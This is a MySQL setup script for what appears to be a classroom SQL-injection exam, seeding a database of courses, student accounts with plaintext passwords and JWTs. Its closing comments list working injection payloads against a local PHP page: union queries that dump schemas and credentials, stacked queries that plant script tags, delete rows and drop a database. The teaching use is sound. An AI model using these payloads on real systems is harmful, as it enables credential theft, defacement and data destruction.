DROP DATABASE IF EXISTS examen;
CREATE DATABASE examen CHARACTER SET utf8mb4;
USE examen;

CREATE TABLE programa (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  nombre VARCHAR(200) NOT NULL
);

CREATE TABLE materia (
  id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  nombre VARCHAR(200) NOT NULL,
  creditos INT NOT NULL,
  id_programa INT UNSIGNED NOT NULL,
  FOREIGN KEY (id_programa) REFERENCES programa(id)
);

CREATE TABLE usuario (
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    login VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    nombre VARCHAR(200) NOT NULL
);

CREATE TABLE etapa_usuario (
    id_usuario INT UNSIGNED,
    login VARCHAR(100),
    etapa1 BOOLEAN NOT NULL,
    etapa2 BOOLEAN NOT NULL,
    etapa3 BOOLEAN NOT NULL,
    etapa4 BOOLEAN NOT NULL,
    etapa5 BOOLEAN NOT NULL,
    ip_etapa1 VARCHAR(45), -- Soporta IPv4 e IPv6
    ip_etapa2 VARCHAR(45),
    ip_etapa3 VARCHAR(45),
    ip_etapa4 VARCHAR(45),
    ip_etapa5 VARCHAR(45),
    jwt VARCHAR(255) NOT NULL,
    PRIMARY KEY (id_usuario),
    FOREIGN KEY (id_usuario) REFERENCES usuario(id),
    FOREIGN KEY (login) REFERENCES usuario(login)
);

INSERT INTO programa VALUES(1, 'Ingeniería de Software');
INSERT INTO programa VALUES(2, 'Ingeniería en Ciberseguridad e Infraestructura de Cómputo');

INSERT INTO materia VALUES(1, 'Diseño de Software', 8, 1);
INSERT INTO materia VALUES(2, 'Pruebas y Calidad de Software', 8, 1);
INSERT INTO materia VALUES(3, 'Arquitectura de Software', 8, 1);
INSERT INTO materia VALUES(4, 'Seguridad Informática', 8, 2);
INSERT INTO materia VALUES(5, 'Infraestructura de Cómputo', 8, 2);
INSERT INTO materia VALUES(6, 'Criptografía y Esteganografía', 8, 2);

-- Inserción del nuevo usuario con id = 1
INSERT INTO usuario (id, login, password, nombre) VALUES
(1, 'gvera', 'patito', 'Guillermo Vera Amaro');

-- Inserción de los usuarios originales
INSERT INTO usuario (login, password, nombre) VALUES
('kmarquez', 'manzana', 'Bautista Marquez Katherine'),
('dbello', 'pera', 'Bello Ibarra Diego Ali'),
('ebenitez', 'uva', 'Benitez Aguilar Ethan Roberto'),
('ecarrera', 'mango', 'Carrera Colorado Eduardo'),
('lcasas', 'kiwi', 'Casas Vazquez Luis Manuel'),
('pdelacruz', 'cereza', 'De La Cruz Moreno Pablo Hernan'),
('rfernandez', 'sandia', 'Fernandez Rodriguez Rodolfo'),
('bgarcia', 'naranja', 'Garcia Hernandez Benjamin Del Angel'),
('cgonzalez', 'limon', 'Gonzalez Lopez Cesar'),
('smartinez', 'piña', 'Martinez Aguilar Sulem'),
('fmendez', 'fresa', 'Mendez Peralta Fausto'),
('jmontiel', 'papaya', 'Montiel Salas Jesus Jacob'),
('rreyes', 'melon', 'Reyes Rodriguez Jose Armando'),
('atamariz', 'guayaba', 'Tamariz Moreno Aneth Michelle'),
('avazquez', 'durazno', 'Vazquez Quinto Abraham David');

INSERT INTO etapa_usuario (id_usuario, login, etapa1, etapa2, etapa3, etapa4, etapa5, ip_etapa1, ip_etapa2, ip_etapa3, ip_etapa4, ip_etapa5, jwt) VALUES
(1, 'gvera', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImxvZ2luIjoiZ3ZlcmEifQ.sUzS2jcGmKmA9g-NZjKE8grAXtp_a2TGzLFYm75Sp_E'),
(2, 'kmarquez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsImxvZ2luIjoia21hcnF1ZXoifQ.u-6HMeKSkadT6C1S4IrCeM1mBFSF2Hd17lD2YRbI_WM'),
(3, 'dbello', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjMsImxvZ2luIjoiZGJlbGxvIn0.b3uHp-rqOOU6RDq44nBp8KqZ8U3bymRVpUmg6ihJfUM'),
(4, 'ebenitez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsImxvZ2luIjoiZWJlbml0ZXoifQ.rOv1-0_pW1FYYp5XsT-8wnfGpWsFl5THGa6xq2NYLVo'),
(5, 'ecarrera', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjUsImxvZ2luIjoiZWNhcnJlcmEifQ.6JQzMrRfK-uRDoCm8vGPElMx7IvxVzJbyGcx10U6BXI'),
(6, 'lcasas', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjYsImxvZ2luIjoibGNhc2FzIn0.GBwnZrSBkBmA8A20ZKxZPjD6icmW58FGgJ-5Wn_x13o'),
(7, 'pdelacruz', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjcsImxvZ2luIjoicGRlbGFjcnV6In0.QEGD0eQ0X6YIoLXNnhcLyxDyNBo_R4QEtV3JZTFLVvc'),
(8, 'rfernandez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjgsImxvZ2luIjoicmZlcm5hbmRleiJ9.XzHnInZODaXQjDCiPpydTFMZVEHQoqyGaA_JTKDpIKc'),
(9, 'bgarcia', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjksImxvZ2luIjoiYmdhcmNpYSJ9._EF9zqtn70MgjkVmf3SKYP3D_0KjMQN8BXod6Cpk-WU'),
(10, 'cgonzalez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwLCJsb2dpbiI6ImNnb256YWxleiJ9.Z8jUoIWlk-RYYT39utTNwHcfVORcRdswLVygRMrZ3Nc'),
(11, 'smartinez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjExLCJsb2dpbiI6InNtYXJ0aW5leiJ9.igBL6N9TO4UnxLyUyicr7EQcx7I9k6xCW5Pwi6LgVD4'),
(12, 'fmendez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyLCJsb2dpbiI6ImZtZW5kZXoifQ.4LeKgfMxCT4YPXPbHnFqOgJq8ViEhQvMnqM-Y8MhtE8'),
(13, 'jmontiel', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEzLCJsb2dpbiI6ImpNb250aWVsIn0.d8Nfhck-pNY9zA3cGKH_M-KQvOkdnIlBcmPBL-VzUpA'),
(14, 'rreyes', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjE0LCJsb2dpbiI6InJyZXllcyJ9.9A99OJMA0A55y_PSBWKe0SFCt5JoG_95khHtLE65DeA'),
(15, 'atamariz', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjE1LCJsb2dpbiI6ImF0YW1hcml6In0.oSpFTYM53EhXbhmLv_4ojTQQoUEmggM-KUm1B6BS9Oc'),
(16, 'avazquez', FALSE, FALSE, FALSE, FALSE, FALSE, NULL, NULL, NULL, NULL, NULL, 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjE2LCJsb2dpbiI6ImF2YXpxdWV6In0.QFuhMN0_rYE29HlyMh9BlgzyMoV9KpIoYRV5rL9L1XE');

-- source C:\codigo\2024-25\ps\cwe-89-2doparcial\bd.sql
-- source /home/administrador/examen/bd.sql
-- CREATE USER examen_user@localhost IDENTIFIED BY 'patito';
-- GRANT SELECT ON examen.* TO examen_user@localhost;
-- GRANT INSERT ON examen.programa TO examen_user@localhost;
-- SHOW GRANTS FOR examen_user@localhost;

-- http://localhost:3000/materias.php?id=-1 union select 1,2,3--
-- http://localhost:3000/materias.php?id=-1 union select 1,2,3,4--
-- http://localhost:3000/materias.php?id=-1 union select 1,database(),3,4--
-- http://localhost:3000/materias.php?id=-1 union select 1,current_user(),3,4--
-- http://localhost:3000/materias.php?id=-1 union select 1,version(),3,4--
-- http://localhost:3000/materias.php?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema=database()--
-- http://localhost:3000/materias.php?id=-1 union select 1,table_schema,table_name,4 from information_schema.tables--
-- http://localhost:3000/materias.php?id=-1 union select 1,2,column_name,4 from information_schema.columns where table_name='usuario'--
-- http://localhost:3000/materias.php?id=-1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='usuario'--
-- http://localhost:3000/materias.php?id=-1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=0x70726F647563746F--

-- EXAMEN
-- ' or 1=1-- 
-- -1 union select 1,2,3,4--
-- -1 union select 1,2,table_name,4 from information_schema.tables where table_schema=database()--
-- -1 union select id,login,password,nombre from usuario --
-- -1 union select 1,2,column_name,4 from information_schema.columns where table_name='usuario'--
-- -1 union select id,login,password,nombre from usuario where login='gvera'--
-- -1; insert into programa values(null,'gvera')--

-- TAREA
-- http://localhost:3000/materias.php?id=-1 union select 1,2,group_concat(user, '@', host),4 from mysql.user--
-- http://localhost:3000/materias.php?id=-1; insert into fabricante values(null,'<script>alert("Hackeado")</script>') --
-- http://localhost:3000/materias.php?id=-1; insert into fabricante values(null,'<script>document.querySelector("nav").innerHTML="<img src=https://shorturl.at/UiCrO>"</script>') --
-- http://localhost:3000/materias.php?id=-1; update fabricante set nombre=concat(nombre,' código malicioso') --
-- http://localhost:3000/materias.php?id=-1; delete from producto --
-- http://localhost:3000/materias.php?id=-1; drop database tienda --